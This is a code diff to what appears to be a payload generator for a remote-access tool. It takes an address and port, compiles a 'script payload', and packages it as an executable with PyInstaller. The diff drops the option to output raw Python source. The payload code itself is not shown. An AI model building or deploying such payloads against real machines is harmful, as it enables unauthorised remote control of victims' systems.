@@ -6,38 +6,28 @@ import PyInstaller.__main__
 
 from common.output import *
 
-
 class GENERATOR:
 
     def __init__(self, parser):
-        self.output_path = self.append_payload_extension(parser.output, parser.source)
+        self.output_path = self.append_payload_extension(parser.output)
         self.base_directory = os.path.dirname(__file__)
         self.temp_dir = ""
         self.script_code = self.compile_script(parser.address, parser.port)
 
-        if parser.source:
-            self.generate_script()
-        else:
-            self.generate_executable()
-            self.clean()
+        self.generate_executable()
+        self.clean()
 
-    def append_payload_extension(self, out, source):
+    def append_payload_extension(self, out):
         filename = ""
-        if source:
-            if not out.endswith(".py"):
-                filename = (out + ".py")
+        if platform.system() == "Windows":
+            if not out.endswith(".exe"):
+                filename = (out + ".exe")
             else:
                 filename = out
+        elif platform.system() == "Linux":
+            filename = (out)
         else:
-            if platform.system() == "Windows":
-                if not out.endswith(".exe"):
-                    filename = (out + ".exe")
-                else:
-                    filename = out
-            elif platform.system() == "Linux":
-                filename = (out)
-            else:
-                print_red("Unrecognized Platform")
+            print_red("Unrecognized Platform")
         return filename
 
     def compile_script(self, ip, port):
@@ -63,7 +53,6 @@ class GENERATOR:
         fl.write(self.script_code)
         fl.close()
         print_green("Generated script payload. " + make_cyan("File: " + self.output_path))
-
 
     def generate_executable(self):
         self.temp_dir = self.generate_temp_dir()
